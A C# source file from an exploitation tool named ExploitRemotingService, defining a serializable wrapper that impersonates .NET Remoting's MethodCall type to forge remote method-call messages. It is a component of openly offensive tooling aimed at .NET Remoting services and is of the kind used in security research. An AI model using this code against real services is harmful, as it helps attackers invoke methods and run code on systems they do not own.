﻿//    ExploitRemotingService
//    Copyright (C) 2019 James Forshaw
//
//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Linq;
using System.Reflection;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Serialization;

namespace ExploitRemotingService
{
    [Serializable]
    class MethodCallWrapper : ISerializable
    {
        private readonly string _uri;
        private readonly MethodBase _method;
        private readonly object[] _args;

        public MethodCallWrapper(string uri, MethodBase method, object[] args)
        {
            _uri = uri;
            _method = method;
            _args = args;
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(MethodCall));
            info.AddValue("__Uri", _uri);
            info.AddValue("__MethodName", _method.Name);
            info.AddValue("__MethodSignature", _method.GetParameters().Select(p => p.ParameterType).ToArray());
            info.AddValue("__Args", _args);
            info.AddValue("__TypeName", _method.DeclaringType.FullName);
            info.AddValue("__CallContext", string.Empty);
        }
    }
}
